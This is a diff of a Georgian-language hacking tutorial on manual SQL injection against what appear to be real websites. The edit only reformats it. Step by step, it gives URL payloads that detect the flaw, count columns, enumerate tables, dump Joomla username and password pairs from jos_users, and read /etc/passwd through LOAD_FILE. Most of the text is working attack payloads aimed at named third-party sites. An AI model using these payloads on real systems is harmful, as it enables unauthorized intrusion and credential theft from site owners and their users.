@@ -12,11 +12,15 @@
 
 საიტი შემდეგია:
 
-**[[http://www.kiis.com.ua/?id=2&sp=1]]**
+```
+http://www.kiis.com.ua/?id=2&sp=1
+```
 
 როდესაც მოცემულია მსგავსი ბმულლი (რაღაცა.php?id=რიცხვი), ბაგის საპოვნელად საკმარისია ბმულის ბოლოში **'** -ს მიწერა.
 
-**[[http://www.kiis.com.ua/?id=2&sp=1']]**
+```
+http://www.kiis.com.ua/?id=2&sp=1'
+```
 
 თუ საიტი ამოგვიგდებს შეცდომას (ოღონდ არა ნებისმიერს) ესე იგი შეიძლება ინექციის განხორციელება. როგორც ხედავთ ამ შემთხვევაშიც შეგვიძლია ინექციის გაკეთება.
 
@@ -32,21 +36,29 @@
 
 სტოლბების დათვლა ხდება შემდეგნაირად: ვივარაუდოთ, რომ მოცემულ გვერდს აქვს 10 სტოლბა, ამის შესამოწმებლად ჩვენ ვაკეთებთ შემდეგს...
 
-**[[http://www.kiis.com.ua/?id=2&sp=1+order+by+10--]]**
+```
+http://www.kiis.com.ua/?id=2&sp=1+order+by+10--
+```
 
 როგორც ვხედავთ საიტი ისევ გვიჩვენებს შეცდომას, ეს იმას ნიშნავს, რომ გვაქვს 10 სტოლბაზე ნაკლები. ვაგრძელებთ... შემდეგი ვარაუდი 5 სტოლბა...
 
-**[[http://www.kiis.com.ua/?id=2&sp=1+order+by+5--]]**
+```
+http://www.kiis.com.ua/?id=2&sp=1+order+by+5--
+```
 
 როგორც ხედავთ საიტი აღარ გვაძლევს იმ შეცდომას, რომელიც საშუალებას გვაძლევს განვახორციელოთ ინექცია (მაპატიეთ ტაფტალოგიისთვის:). ეს იმას ნიშნავს, რომ გვაქვს 5 სტოლბაზე მეტი.
 
 ახლა უკვე ჩვენ ვიცით, რომ გვაქვს 5-ზე მეტი და 10-ზე ნაკლები სტოლბა. ვაგრძელებთ თვლას... ვივარაუდოთ 8 სტოლბა:
 
-**[[http://www.kiis.com.ua/?id=2&sp=1+order+by+8--]]**
+```
+http://www.kiis.com.ua/?id=2&sp=1+order+by+8--
+```
 
 ისევ ვხედავთ შეცდომა. ვცადოთ 9 :)
 
-**[[http://www.kiis.com.ua/?id=2&sp=1+order+by+9--]]**
+```
+http://www.kiis.com.ua/?id=2&sp=1+order+by+9--
+```
 
 საიტი არ აგდებს შეცდომას. ალბათ მიხვდით რასაც ნიშნავს ეს :) ჩვენ გვაქვს 9 სტოლბა. :)
 
@@ -55,7 +67,9 @@
 
 ინფორმაციის გამოსატანად ჩვენ დაგვჭირდება **union+select** ბრძანება. რადგანაც ჩვენ გვაქვს 9 სტოლბა ჩვენი ბმული მიიღებს შემდეგ სახეს:
 
-**[[http://www.kiis.com.ua/?id=2&sp=1+union+select+1,2,3,4,5,6,7,8,9--]]**
+```
+http://www.kiis.com.ua/?id=2&sp=1+union+select+1,2,3,4,5,6,7,8,9--
+```
 
 ალბათ შეამჩნიეთ ციფრი 5, რომელიც გაჩნდა ჩვენს გვერდზე. ეს ნიშნავს, რომ პრინტაბული სტოლბა არის 5.
 
@@ -66,7 +80,9 @@
 
 ამისათვის შემოგთავაზებთ ორ ბრძანებას, **@@version** და **version()**. პრინტაბელი სტოლბის მაგივრად ჩვენ უნდა ჩავსვათ რომელიმე ამ ბრძანებებისგან, საპასუხოდ კი 5-იანის (პრინტაბელური სტოლბის) ადგილას უნდა გამოვიდეს sql-ის ვერსსია. ვაგრძელებთ... ჩვენმა ბმულმა მიიღო შემდეგი სახე:
 
-**[[http://www.kiis.com.ua/?id=2&sp=1+union+select+1,2,3,4,@@version,6,7,8,9--]]**
+```
+http://www.kiis.com.ua/?id=2&sp=1+union+select+1,2,3,4,@@version,6,7,8,9--
+```
 
 //sql-ის 4 ვერსიაზე ჩვენ ვერ შევძლებთ table-ებისა და column-ების სახელების გაგებას, ამიტომ მოგვიწევს მათი შერჩევა ხელით. გავაგრძელოთ კითხვა, ამ საკითხს მივუბრუნდები სტატიის ბოლოში.//
 
@@ -81,7 +97,9 @@
 
 ბმული გამოიყურება შემდეგნაირად:
 
-[[http://www.kiis.com.ua/?id=2&sp=1+union+select+1,2,3,4,group_concat(table_name),6,7,8,9+from+information_schema.tables--]]
+```
+http://www.kiis.com.ua/?id=2&sp=1+union+select+1,2,3,4,group_concat(table_name),6,7,8,9+from+information_schema.tables--
+```
 
 როგორც ვხედავთ გვერდზე გამოვიდა table-ები, მაგრამ ეს არაა სრული სია. ამ table-ებს შეიძლება დავარქვათ დეფაულტ table-ები, ამიტომ ჩვენ უნდა მოვიხხმარიოთ სხვა ხერხი. ჩვენს ბრძანებას 
 
@@ -89,7 +107,9 @@
 
 ბმული გამოიყუება შემდეგნაირად:
 
-[[http://www.kiis.com.ua/?id=2&sp=-1+union+select+1,2,3,4,concat(table_name),6,7,8,9+from+information_schema.tables--]]
+```
+http://www.kiis.com.ua/?id=2&sp=-1+union+select+1,2,3,4,concat(table_name),6,7,8,9+from+information_schema.tables--
+```
 
 გამოყოფს table-ებს ერთმანეთისაგან.
 
@@ -115,7 +135,9 @@
 
 ჩვენ უკვე ვიცით **jos_users** table-ს შესაბამისი column-ები. ახლა უნდა ავირჩიოთ მათგან რამოდენიმე, ჩვენთვის საინტერესო. ამ შემთხვევაში გვაინტერესებს username და password. **jos_users** table-სგან რომ მოვიპოვოთ ინფორმაცია username-სა და password-ების შესახებ ვაკეთებთ შემდეგს:
 
-**[[http://www.kiis.com.ua/?id=2&sp=-1+union+select+1,2,3,4,concat(username,0x3a,password),6,7,8,9+from+jos_users--]]**
+```
+http://www.kiis.com.ua/?id=2&sp=-1+union+select+1,2,3,4,concat(username,0x3a,password),6,7,8,9+from+jos_users--
+```
 
 3a არის **:** -ის ჰექსი (სტანდარტულად, ჰექსის წინ იწერება 0x). ანუ - ჯერ უნდა გამოვიდეს username, შემდეგ :  შემდეგ კი password.
 
@@ -131,20 +153,21 @@
 
 არის ისეთი შემთხვევებიც როცა ჩვენ შეგვიძლია სხვადასხვა ფაილების წაკითხვა სერვერზე, ინექციის საშუალებით. მგონი საკმარისი იქნება ერთი მაგალითის ჩვენება... და აი ისიც:
 
-
-**[[http://wwww.breakfastandbrunch.com/shop.php?catid=-2+union+select+LOAD_FILE('/etc/passwd')--]]**
-
+```
+http://wwww.breakfastandbrunch.com/shop.php?catid=-2+union+select+LOAD_FILE('/etc/passwd')--
+```
 
 პრინტაბელური სტოლბის ადგილას უნდა ჩავწეროთ მაგალითად, **LOAD_FILE('/etc/passwd')** ან **LOAD_FILE('/etc/hosts')**
 
-
-**[[http://www.breakfastandbrunnch.com/shop.php?catid=-2+union+select+LOAD_FILE('/etc/hosts')--]]**
-
+```
+http://www.breakfastandbrunnch.com/shop.php?catid=-2+union+select+LOAD_FILE('/etc/hosts')--
+```
 
 აქაც შესაძლებელია ჰექსების გამოყენება, მაგალითად:
 
-
-**[[http://www.breakfastandbrunch.com/shop.php?catid=-2+union+select+LOAD_FILE(0x2f6574632f706173737764)--]]**
+```
+http://www.breakfastandbrunch.com/shop.php?catid=-2+union+select+LOAD_FILE(0x2f6574632f706173737764)--
+```
 
 სულ ეს იყო.
 
